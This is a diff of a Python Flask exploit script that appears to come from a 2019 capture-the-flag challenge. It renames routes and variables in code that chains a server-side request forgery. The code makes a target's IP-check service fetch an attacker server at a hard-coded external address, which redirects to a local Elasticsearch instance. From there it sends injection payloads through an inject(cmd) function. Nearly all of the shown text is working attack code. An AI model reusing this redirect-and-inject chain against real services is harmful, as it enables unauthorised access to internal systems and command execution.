@@ -13,11 +13,9 @@ import requests
 import sys
 import requests, json
 
-search = lambda p: requests.get("http://89.163.129.121:5000/check/_search", params={"source": json.dumps(p)}).text
-
 app = Flask(__name__)
 
-url = ""
+elk_url = ""
 
 @app.route("/save/<path:path>", methods=['POST', 'PUT'])
 def saver(path):
@@ -34,15 +32,18 @@ def cmd():
 @app.route("/")
 def hello():
     resp = Response('redirect')
-    resp.headers['Location'] = url
+    resp.headers['Location'] = elk_url
     return resp, 302
 
-@app.route("/check/<path:path>")
+@app.route("/push/<path:path>")
 def check(path):
-    global url
-    url = 'http://127.0.0.1:9200/'+ path +'?' + request.query_string.decode()
+    global elk_url
+    elk_url = 'http://127.0.0.1:9200/'+ path +'?' + request.query_string.decode()
     req = requests.post("http://users.ctf2019.rocks/checkip", data={"ip":"http://89.163.129.121:5000"})
     return req.text, req.status_code
+
+def elk_q(payload):
+    requests.get("http://89.163.129.121:5000/push/_search", params={"source": json.dumps(payload)}).text
 
 def inject(cmd):
     payload = {
@@ -53,7 +54,7 @@ def inject(cmd):
             }
          }
     }
-    search(payload)
+    elk_q(payload)
 
 if __name__ == "__main__":
     if sys.argv[1] == 'start':
